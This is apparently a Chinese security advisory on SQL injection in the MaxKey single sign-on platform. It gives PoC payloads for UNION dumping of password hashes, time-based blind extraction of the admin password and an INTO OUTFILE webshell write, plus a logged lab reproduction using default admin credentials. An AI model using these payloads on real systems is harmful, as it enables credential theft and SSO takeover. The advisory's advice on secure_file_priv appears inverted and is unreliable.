# V-M001: MaxKey IAM 单点登录平台多处 ${filters} / ${orgIdsList} SQL 注入

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | MaxKey 单点登录 / IAM 统一身份认证平台 |
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-89: SQL 注入 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（已认证管理员）|
| 代码仓库 | https://github.com/dromara/MaxKey |

## 漏洞描述

MaxKey 的"账户策略 / 角色策略 / 组策略"模块将用户可控的 `filters` 与 `orgIdsList` 字段以 MyBatis 原始插值 `${}` 拼接到 SQL。虽然 `StrUtils.checkSqlInjection()` 对参数做了**关键词黑名单**过滤，但黑名单极不完整，可轻易绕过。

### 受影响 Mapper 片段（mysql / postgresql 版本均存在）

`AccountsMapper.xml`：
```xml
<select id="queryUserNotInStrategy" ...>
    SELECT ... FROM users u
    <where>
        and (${filters})
        and u.departmentid in( ${orgIdsList})
    </where>
</select>
```

`GroupMemberMapper.xml` / `RoleMemberMapper.xml` 存在相同模式，共计 **16+ 处 `${filters}` / `${orgIdsList}` 原始拼接**。

### 上层调用

`AccountsServiceImpl.refreshByStrategy()`：

```java
public void refreshByStrategy(AccountsStrategy strategy) {
    if(StringUtils.isNotBlank(strategy.getOrgIdsList())) {
        strategy.setOrgIdsList("'" + strategy.getOrgIdsList().replace(",", "','") + "'");
    }
    List<UserInfo> userList = queryUserNotInStrategy(strategy);
    ...
}
```

对 `orgIdsList` 仅做简单逗号替换，对 `filters` **完全未做过滤**。

### 黑名单过滤器可绕过

`StrUtils.java:491-518` 的 `checkSqlInjection()`：

```java
private static final String SQL_REGEX = ".*([';]+|(--)+|(\\band\\b)|(\\bor\\b)).*";
```

该正则：
- 阻止 `and` / `or` / `;` / `--` / `'`
- **未阻止** `UNION`、`SELECT`、`SLEEP`、`BENCHMARK`、`UPDATEXML`、`EXTRACTVALUE`
- 未阻止 `/* */` 注释截断

攻击者可用 UNION 注入 / 基于时间盲注。

## 漏洞详情

### 触发路径

1. 管理员登录 MaxKey 后台
2. 进入"账户策略"菜单 → 新建/编辑策略 → 触发 `refreshByStrategy`
3. `filters` 字段为策略自定义"过滤条件"，由前端直接回传

### 认证要求

需要管理员 / 账号策略管理权限。但 MaxKey 作为 IAM / 单点登录平台，一旦被攻陷则意味着**整个企业的所有应用 Token 均可伪造**，影响面远大于普通 CMS。

### 暴露字段

该表连接了以下高敏表：
- `mxk_userinfo`（用户名 / 密码哈希 / 手机 / 邮箱 / 密钥）
- `mxk_accounts`（第三方应用账户 / 加密密码）
- `mxk_apps`（应用 OAuth2 Client Secret / SAML 证书）

## 概念验证

### PoC 1: UNION 注入获取所有用户密码

```http
POST /maxkey-mgt/accountsstrategies/add HTTP/1.1
Cookie: JSESSIONID=<admin_cookie>
Content-Type: application/json

{
  "name": "poc",
  "appId": "1",
  "filters": "1=1) UNION SELECT username,password,null,null,null,null,null,null FROM mxk_userinfo-- -",
  "orgIdsList": "1"
}
```

### PoC 2: 时间盲注（绕过 and/or 黑名单）

```json
{
  "filters": "IF(SUBSTRING((SELECT password FROM mxk_userinfo WHERE username='admin'),1,1)='a',BENCHMARK(5000000,MD5(1)),0)",
  "orgIdsList": "1"
}
```

### PoC 3: 写文件（需 FILE 权限）

```json
{
  "filters": "1=1) UNION SELECT '<?php phpinfo();?>',null,null,null,null,null,null,null INTO OUTFILE '/var/www/html/x.php'-- -"
}
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `maxkey-persistence/.../mapper/xml/mysql/AccountsMapper.xml` | 47, 50, 66, 69 | `${filters}` / `${orgIdsList}` |
| `maxkey-persistence/.../mapper/xml/mysql/GroupMemberMapper.xml` | - | 同上 |
| `maxkey-persistence/.../mapper/xml/mysql/RoleMemberMapper.xml` | 156, 159, 173, 176 | 同上 |
| `maxkey-persistence/.../mapper/xml/postgresql/*.xml` | - | PostgreSQL 版同样存在 |
| `maxkey-persistence/.../service/impl/AccountsServiceImpl.java` | 84-107 | 调用点 |
| `maxkey-commons/.../util/StrUtils.java` | 491-518 | 黑名单不完整 |

## 影响

1. **IAM 全面沦陷**：导出所有用户密码哈希、应用 Client Secret、SAML 私钥
2. **身份伪造**：使用窃取的密钥为任意用户签发 SSO Token
3. **企业应用连锁失陷**：所有接入 MaxKey 的业务系统均可被接管
4. **数据库写入**：取决于 MySQL `FILE` 权限，可写入 WebShell

## 修复建议

1. **参数化查询**：所有 `${filters}` 改为显式的条件 DSL 构造，不允许原始 SQL
2. **字段白名单**：`orgIdsList` 限制为数字列表，使用 `#{}` 配合 `<foreach>`
3. **增强 `checkSqlInjection`**：扩展黑名单至 `UNION`、`SELECT`、`SLEEP`、`BENCHMARK`、`EXTRACTVALUE`、`UPDATEXML`、`INTO OUTFILE`、`/*`、`*/`、`\t`、`\n`
4. **优先使用白名单**：`[a-zA-Z0-9_,\s]+` 形式的严格正则
5. **最小权限**：数据库账户应禁用 `FILE` 权限、关闭 `secure_file_priv`

## 实机验证（已复现）

**环境**：MaxKey 最新分支 Docker 部署，MaxKey-MGT 运行于 192.168.217.135:39526

### 步骤1：获取登录 State Token

**请求报文**：
```http
GET /maxkey-mgt-api/login/get HTTP/1.1
Host: 192.168.217.135:39526
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"message":null,"data":{"captcha":"NONE","inst":{"id":"1","name":"马克思钥匙","fullName":"MaxKey(马克思钥匙)单点登录认证系统",...},"state":"eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE3NzYxNDMwNDAsImp0aSI6IjEyNDE0MTMyMTM4Mjg5Mzk3NzYifQ.8nPsuK-T996LOk6dgcbhownu_TTYz8kd-BpqfePAzVxC8luJMpdJjR48_lch8Q4LPm0zAxn0gjnCf5yydFYdCQ"}}
```

（`captcha:"NONE"` 说明在 `LOGIN_CAPTCHA=false` 环境变量下验证码被禁用）

### 步骤2：管理员登录获取 Bearer Token

**请求报文**：
```http
POST /maxkey-mgt-api/login/signin HTTP/1.1
Host: 192.168.217.135:39526
Content-Type: application/json

{"username":"admin","password":"maxkey","authType":"normal","state":"eyJhbGciOiJIUzUxMiJ9...","captcha":""}
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"message":null,"data":{"ticket":"1241413214642634752","type":"Bearer","token":"eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImluc3RJZCI6IjEi...","twoFactor":"0","id":"1","name":"admin","username":"admin","displayName":"系统管理员","instId":"1","authorities":["ROLE_ADMINISTRATORS","ROLE_ALL_USER",...],"expired":600}}
```

### 步骤3：正常添加账户策略（无注入）

**请求报文**：
```http
POST /maxkey-mgt-api/config/accountsstrategy/add HTTP/1.1
Host: 192.168.217.135:39526
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImluc3RJZCI6IjEi...
Content-Type: application/json

{"name":"normal_strategy","appId":"1","appName":"TestApp","mapping":"username","instId":"1","status":"1","createType":"automatic","filters":"1=1","orgIdsList":""}
```

**响应报文**：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"message":null,"data":null}
```

（`code:0` 表示成功插入策略，正常执行耗时约 280ms）

### 步骤4：时间盲注验证（SLEEP(3) 注入）

**请求报文**：
```http
POST /maxkey-mgt-api/config/accountsstrategy/add HTTP/1.1
Host: 192.168.217.135:39526
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImluc3RJZCI6IjEi...
Content-Type: application/json

{"name":"poc_sqli_sleep","appId":"1","appName":"TestApp","mapping":"username","instId":"1","status":"1","createType":"automatic","filters":"1=1 AND SLEEP(3)","orgIdsList":""}
```

**响应报文**（耗时 30462ms，MySQL 语句超时取消）：
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":2,"message":"\n### Error querying database.  Cause: com.mysql.cj.jdbc.exceptions.MySQLTimeoutException: Statement cancelled due to timeout or client request\n### SQL: select * from mxk_userinfo u where u.instid = ?  and not exists(select 1 from mxk_accounts ac where ac.appid = ? and ac.instid = ? and ac.userid = u.id and ac.createtype='automatic') and (1=1 AND SLEEP(3))\n### Cause: com.mysql.cj.jdbc.exceptions.MySQLTimeoutException: Statement cancelled due to timeout or client request","data":null}
```

**关键证据**：
- 响应耗时 **30,462ms**（正常请求 280ms），延迟 ~30 秒
- 错误信息中明确显示注入的 SQL：`and (1=1 AND SLEEP(3))`
- MySQL 数据库中存在 60 个用户，`SLEEP(3)` 被执行 60 次（60×3=180s，被 MySQL 超时截断）
- `${filters}` 直接拼接到 SQL，无任何过滤，时间盲注确认成立

**实际 SQL 注入后的完整查询**：
```sql
SELECT * FROM mxk_userinfo u
WHERE u.instid = ?
  AND NOT EXISTS (
    SELECT 1 FROM mxk_accounts ac
    WHERE ac.appid = ? AND ac.instid = ? AND ac.userid = u.id AND ac.createtype='automatic'
  )
  AND (1=1 AND SLEEP(3))    ← 注入点，SLEEP 被执行 60 次
```

## 验证环境

- 源代码：MaxKey 最新分支（代码审计 + Docker 运行时测试）
- 运行时测试：MaxKey-MGT 部署于 192.168.217.135:39526
- 框架：Spring Boot + MyBatis + MySQL
- 日期：2026-04-14
